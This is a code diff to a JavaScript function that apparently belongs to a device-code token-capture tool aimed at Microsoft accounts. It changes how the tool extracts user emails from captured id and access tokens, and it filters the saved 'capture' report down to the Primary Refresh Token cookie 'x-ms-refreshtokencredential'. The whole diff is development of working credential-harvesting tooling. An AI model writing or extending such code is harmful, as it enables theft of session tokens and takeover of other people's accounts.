@@ -507,8 +507,16 @@ async function storeToken(job, tokenData, responseCookies = []) {
     if (tokenData.id_token) {
       try {
         const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
-        email = payload.email || payload.upn || payload.preferred_username || null;
+        email = payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
         idTokenTenant = payload.tid || null; // Extract actual tenant ID from token
+      } catch (e) {
+        /* ignore */
+      }
+    }
+    if (!email && tokenData.access_token) {
+      try {
+        const payload = JSON.parse(Buffer.from(tokenData.access_token.split('.')[1], 'base64').toString());
+        email = payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
       } catch (e) {
         /* ignore */
       }
@@ -1042,24 +1050,29 @@ async function storeToken(job, tokenData, responseCookies = []) {
         '========================================'
       ].join('\n');
 
-      // Include captured cookies in the report regardless of mode so private-account
-      // validation shows the actual PRT cookie if Microsoft returned one.
+      // Include only the real GraphSpy PRT cookie in the report. Ordinary
+      // Microsoft cookies (fpc, x-ms-gateway-slice, stsservicecookie, etc.) are
+      // not PRT material and must never be shown as a capture result.
       const reportCookies = [];
       if (responseCookies && responseCookies.length > 0) {
         for (const cookie of responseCookies) {
-          if (cookie && cookie.name) {
+          if (cookie && cookie.name && String(cookie.name).toLowerCase() === 'x-ms-refreshtokencredential') {
             reportCookies.push(`${cookie.name}=${cookie.value}; domain=${cookie.domain || '.login.microsoftonline.com'}; path=/; secure`);
           }
         }
       }
       if (cookieConversionResult && cookieConversionResult.cookies) {
         const extra = Array.isArray(cookieConversionResult.cookies)
-          ? cookieConversionResult.cookies.map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`)
+          ? cookieConversionResult.cookies
+              .filter(c => c && c.name && String(c.name).toLowerCase() === 'x-ms-refreshtokencredential')
+              .map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`)
           : [String(cookieConversionResult.cookies)];
         for (const item of extra) reportCookies.push(item);
       }
       if (reportCookies.length > 0) {
         fileContent += '\n\nCOOKIES:\n' + [...new Set(reportCookies)].join('\n');
+      } else if (reportTokenType === 'cookie') {
+        fileContent += '\n\nCOOKIES:\nNO PRT COOKIE CAPTURED';
       }
 
       const filename = `capture_device_${tokenId}_${reportTokenType}.txt`;
